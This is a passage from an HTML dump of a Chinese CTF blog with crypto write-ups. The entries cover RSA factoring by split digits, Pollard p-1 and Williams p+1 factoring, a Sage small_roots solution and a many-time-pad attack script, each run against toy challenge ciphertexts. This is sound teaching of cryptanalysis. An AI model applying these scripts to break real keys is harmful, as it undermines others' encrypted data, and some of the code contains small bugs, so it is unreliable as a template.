number">182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span>n <span class="token operator">=</span> <span class="token number">438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="python-exp"><a href="#python-exp" class="headerlink" title="python  exp"></a>python  exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sympy<span class="token punctuation">.</span>solvers <span class="token keyword">import</span> solve<span class="token keyword">from</span> sympy<span class="token punctuation">.</span>abc <span class="token keyword">import</span> h<span class="token punctuation">,</span>l<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">182812482972168423884795132699225934365072979206288632257180603530046820174392675977209758378734399146216742345585898385168866887000708558119959898992294085847474548306743585711154035585848291290988967352517174312220756638881837930962458861193652684492265539096477345065113556380573776423787885892688197584678128636231428194711357642971544417113415626331810909274966752557628893585198569815939514862013512237657828262360291726912615575646318630641527418369988268899879152029186728850816178597399494254385226049249357897840618728804680238123954207656671747782543031545429711152272581734051959578453680011676521727918037340906791388178004979453256050227967701258768070039292546964652071924183467364467145178290753361477912582242961929982420950384199259355122986865808523351306098081481072454093823090</span>n <span class="token operator">=</span> <span class="token number">438980397031315392229453908048509540832246041631432878509579665664182747463100230160823865621798053164989325086085003940181731721089701380743698761443812523024144817205902380903062054138730658451286904347536210833160924917347633148983052015550354913154312162901555870494273903714349869746793861874257201085777893961715468950661641778512110325457371446203379767458862059193946434683324578530163650541637261158037041205642428802942295011562277084687025213626698849526240663754073508102229066475773893638716845176469070938803298515155140240970836387785401085919369741520890271902332951669953411373633688944162470994856654604872287103746922041844065053274059990595496159866206551119361036237431289830985174384522423364811997241255005514248198447925396378192915553898993758660041223393168707380580012437</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>pqh <span class="token operator">=</span> n <span class="token operator">//</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span>pql <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>pq <span class="token operator">=</span> pqh<span class="token operator">*</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">+</span> pqln <span class="token operator">-=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token operator">*</span>pq <span class="token operator">+</span> pqtmp <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>s <span class="token operator">=</span> solve<span class="token punctuation">(</span><span class="token punctuation">[</span>h<span class="token operator">*</span>l<span class="token operator">-</span>pq<span class="token punctuation">,</span> tmp<span class="token operator">*</span>h<span class="token operator">*</span>h <span class="token operator">+</span> tmp<span class="token operator">*</span>l<span class="token operator">*</span>l <span class="token operator">-</span> n<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>h<span class="token punctuation">,</span> l<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    h<span class="token punctuation">,</span>l <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> h<span class="token operator">*</span>tmp <span class="token operator">+</span> l    q <span class="token operator">=</span> l<span class="token operator">*</span>tmp <span class="token operator">+</span> h    <span class="token keyword">if</span> p <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> q <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> is_prime<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">and</span> is_prime<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># CMISCCTF&#123;easy_math_game_hhhhhhh&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>光滑数</title>
      <link href="/2023/01/15/%E5%85%89%E6%BB%91%E6%95%B0/"/>
      <url>/2023/01/15/%E5%85%89%E6%BB%91%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="p-1光滑（Pollard）"><a href="#p-1光滑（Pollard）" class="headerlink" title="p-1光滑（Pollard）"></a>p-1光滑（Pollard）</h3><pre class="line-numbers language-none"><code class="language-none">如果一个整数的所有素因子都不大于 B，我们称这个数为 B-Smooth 数。设 p−1 是 B-Smooth 的，可设 p−1&#x3D;p1p2⋯pn(∀1≤i≤n,pi≤B)，若 p1,p2,⋯,pn 两两不同，则 p1p2⋯pn∣B!⇒(p−1)∣B!⇒B!&#x3D;k(p−1)。因此 aB!≡ak(p−1)≡1(modp)，假设 N&#x3D;pq，计算 gcd(aB!−1，N)，只要结果大于 0 小于 N，那么结果就为 p。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pollard</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">2</span>    n <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> powmod<span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">,</span> N<span class="token punctuation">)</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> p <span class="token operator">!=</span> N<span class="token punctuation">:</span>            q <span class="token operator">=</span> n <span class="token operator">//</span>p            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p ="</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q ="</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>        n <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> choice<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> isPrime<span class="token punctuation">,</span> sieve_base <span class="token keyword">as</span> primes<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">def</span> <span class="token function">getPrime</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        n <span class="token operator">=</span> <span class="token number">2</span>        <span class="token keyword">while</span> n<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> bits<span class="token punctuation">:</span>            n <span class="token operator">*=</span> choice<span class="token punctuation">(</span>primes<span class="token punctuation">)</span>        <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> n <span class="token operator">+</span> <span class="token number">1</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'big'</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> q <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qc <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>n <span class="token operator">=</span> c <span class="token operator">=</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> primefac <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">0x10001</span>N <span class="token operator">=</span> <span class="token number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span>c <span class="token operator">=</span> <span class="token number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">pollard</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">2</span>    n <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> powmod<span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">,</span> N<span class="token punctuation">)</span>        p <span class="token operator">=</span> gcd<span class="token punctuation">(</span>a<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>        <span class="token keyword">if</span> p <span class="token operator">!=</span> <span class="token number">1</span> <span class="token keyword">and</span> p <span class="token operator">!=</span> N<span class="token punctuation">:</span>            q <span class="token operator">=</span> n <span class="token operator">//</span>p            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p ="</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q ="</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>        n <span class="token operator">+=</span> <span class="token number">1</span>p <span class="token operator">=</span> <span class="token number">178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139</span>q <span class="token operator">=</span> <span class="token number">184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#Lazzaro @ https://lazzzaro.github.io</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="p-1光滑（William）"><a href="#p-1光滑（William）" class="headerlink" title="p+1光滑（William）"></a>p+1光滑（William）</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">mlucas</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">""" Helper function for williams_pp1().  Multiplies along a Lucas sequence modulo n. """</span>    v1<span class="token punctuation">,</span> v2 <span class="token operator">=</span> v<span class="token punctuation">,</span> <span class="token punctuation">(</span>v<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> n    <span class="token keyword">for</span> bit <span class="token keyword">in</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>         v1<span class="token punctuation">,</span> v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> <span class="token punctuation">(</span>v1<span class="token operator">*</span>v2 <span class="token operator">-</span> v<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span> <span class="token keyword">if</span> bit <span class="token operator">==</span> <span class="token string">"0"</span> <span class="token keyword">else</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v1<span class="token operator">*</span>v2 <span class="token operator">-</span> v<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">,</span> <span class="token punctuation">(</span>v2<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token punctuation">)</span>    <span class="token keyword">return</span> v1<span class="token keyword">for</span> v <span class="token keyword">in</span> count<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> p <span class="token keyword">in</span> primegen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> ilog<span class="token punctuation">(</span>isqrt<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>        <span class="token keyword">if</span> e <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>             <span class="token keyword">break</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>             v <span class="token operator">=</span> mlucas<span class="token punctuation">(</span>v<span class="token punctuation">,</span> p<span class="token punctuation">,</span> n<span class="token punctuation">)</span>        g <span class="token operator">=</span> gcd<span class="token punctuation">(</span>v<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token number">1</span> <span class="token operator">&lt;</span> g <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>             <span class="token keyword">return</span> g <span class="token comment"># g|n</span>        <span class="token keyword">if</span> g <span class="token operator">==</span> n<span class="token punctuation">:</span>             <span class="token keyword">break</span><span class="token comment"># Lazzaro @ https://lazzzaro.github.io</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>p,q当做e1,e2共模</title>
      <link href="/2023/01/15/p-q%E5%BD%93%E5%81%9Ae1-e2%E5%85%B1%E6%A8%A1/"/>
      <url>/2023/01/15/p-q%E5%BD%93%E5%81%9Ae1-e2%E5%85%B1%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>flag  <span class="token operator">=</span> <span class="token string">'******************'</span>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>m1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p<span class="token operator">*</span>qflag1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span>p<span class="token punctuation">,</span>n<span class="token punctuation">)</span>flag2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span>q<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag1= '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag2= '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'n= '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>flag1<span class="token operator">=</span> <span class="token number">17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857</span>flag2<span class="token operator">=</span> <span class="token number">95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954</span>n<span class="token operator">=</span>     <span class="token number">140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h3><p>c1 $\equiv$ m**p(mod n)</p><p>c2$\equiv$ m**q(mod n)</p><p>费马小定理</p><p>a^p $\equiv$ a mod p    </p><p>则c1 $\equiv$ m(mod n)</p><p>c2$\equiv$ m(mod n)</p><p>c1&#x3D;ni+m</p><p>c2&#x3D;nj+m</p><p>c1*c2&#x3D;m^2+mn(i+j)+ n**2ij</p><p>c1+c2&#x3D;2m+n(i+j)  </p><p>推出    m^2 - m(c1+c2) + c1*c2   &#x3D;  n^2ij  </p><p>从而构造多项式环    f &#x3D; m^2-(c1+c2)<em>m+c1</em>c2</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">c1<span class="token operator">=</span> <span class="token number">17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857</span>c2<span class="token operator">=</span> <span class="token number">95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954</span>n<span class="token operator">=</span> <span class="token number">140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> m<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span><span class="token punctuation">(</span>c1<span class="token operator">+</span>c2<span class="token punctuation">)</span><span class="token operator">*</span>m<span class="token operator">+</span>c1<span class="token operator">*</span>c2x0 <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到1920535408007397834236393374892057067669865609963495845501</p><p>然后</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1920535408007397834236393374892057067669865609963495845501</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多次一密（Many Time Pad Attack）</title>
      <link href="/2023/01/15/%E5%A4%9A%E6%AC%A1%E4%B8%80%E5%AF%86%EF%BC%88Many-Time-Pad-Attack%EF%BC%89/"/>
      <url>/2023/01/15/%E5%A4%9A%E6%AC%A1%E4%B8%80%E5%AF%86%EF%BC%88Many-Time-Pad-Attack%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>用同一个密钥去加密多条明文，当密文条数较多时就很容易被攻击，例如Many Time Pad。</p><p>这个攻击的原理是 c1⊕c2&#x3D;m1⊕m2c1⊕c2&#x3D;m1⊕m2，而通过 m1⊕m2m1⊕m2 可以分析出 m1⊕m2m1⊕m2，因此 m1⊕m2m1⊕m2 不再安全。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><span class="token keyword">import</span> string<span class="token keyword">import</span> collections<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>c1<span class="token operator">=</span><span class="token string">'daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54'</span>c2<span class="token operator">=</span><span class="token string">'c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb'</span>c3<span class="token operator">=</span><span class="token string">'dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e'</span>c4<span class="token operator">=</span><span class="token string">'d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154'</span>c5<span class="token operator">=</span><span class="token string">'d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a'</span>c6<span class="token operator">=</span><span class="token string">'c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34'</span>c7<span class="token operator">=</span><span class="token 